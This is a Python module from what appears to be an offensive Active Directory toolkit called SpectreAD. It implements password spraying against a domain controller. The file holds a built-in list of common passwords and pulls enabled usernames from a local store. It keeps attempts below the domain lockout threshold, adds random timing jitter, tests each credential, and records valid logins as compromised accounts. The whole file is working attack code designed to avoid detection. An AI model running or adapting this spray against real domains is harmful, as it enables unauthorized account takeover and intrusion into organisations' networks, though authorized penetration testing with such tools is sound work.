"""
SpectreAD :: core/spray.py
Lockout-aware spray: per-user budget, observation window, dry run.

Author : Inayat Hussain
"""

from __future__ import annotations

import random
import time

from core import ui
from core.creds import Cred
from core.store import open_store
from core.transport import check_cred

BUILTIN = [
    "Password1", "Password123", "Welcome1", "Welcome123", "Summer2026", "Winter2026",
    "Autumn2026", "Spring2026", "Company123", "Company2026", "P@ssw0rd", "P@ssw0rd123",
    "ChangeMe123", "Letmein123", "Admin123", "Qwerty123", "LabPassw0rd!2026",
]


def _load(path):
    if not path:
        return list(BUILTIN)
    with open(path, encoding="utf-8", errors="ignore") as fh:
        return [l.strip() for l in fh if l.strip() and not l.startswith("#")]


def _users(store, path):
    if path:
        with open(path, encoding="utf-8", errors="ignore") as fh:
            return [l.strip() for l in fh if l.strip()]
    return [r["sam"] for r in store.enabled_users()]


def _jitter(base: float, spread: float) -> None:
    time.sleep(max(0.0, base + random.uniform(-spread, spread)))


def run(args) -> None:
    with open_store(args.store) as store:
        domain = args.domain
        pol = store.policy(domain)
        if pol is None:
            ui.die("no policy cached — run passpol first")

        threshold = pol["lockout_threshold"] or 0
        budget = (threshold - 1) if threshold else 10**6

        users = _users(store, args.users)
        passwords = _load(args.passwords)[: args.passes]

        if threshold:
            ui.warn(f"lockoutThreshold={threshold} -> budget {budget} attempt(s)/user")
        else:
            ui.ok("no lockout — unlimited attempts")

        ui.card("spray plan", [
            ("domain", domain),
            ("users", len(users)),
            ("passwords", len(passwords)),
            ("attempts", len(users) * len(passwords)),
            ("delay/jitter", f"{args.delay}s / {args.jitter}s"),
            ("dry run", "yes" if args.dry_run else "no"),
        ])
        if threshold and len(passwords) > budget:
            ui.warn(f"{len(passwords)} passwords exceeds budget {budget} — capped")

        cred = Cred(domain, "", "", "password")
        found = 0
        per_user: dict[str, int] = {}

        for pw in passwords:
            ui.edge(f"pass: {pw}")
            for user in users:
                if per_user.get(user, 0) >= budget:
                    continue
                if args.dry_run:
                    ui.info(f"{user}:{pw} (dry)")
                    per_user[user] = per_user.get(user, 0) + 1
                    continue

                cred.username, cred.secret = user, pw
                if check_cred(args.dc_ip, cred, args.timeout):
                    ui.ok(f"VALID  {domain}\\{user}:{pw}")
                    store.add_cred(domain, user, pw, "password", "spray", valid=True)
                    store.add_finding("high", "Valid credentials",
                                      f"{domain}\\{user}:{pw}", cred=f"{domain}\\{user}")
                    store.add_owned(user, "spray")
                    found += 1
                else:
                    store.add_cred(domain, user, pw, "password", "spray", valid=False)
                per_user[user] = per_user.get(user, 0) + 1
                _jitter(args.delay, args.jitter)

        ui.card("spray result", [("valid", found), ("attempts", sum(per_user.values()))])
        store.log("spray", "complete", domain, f"{found} valid")
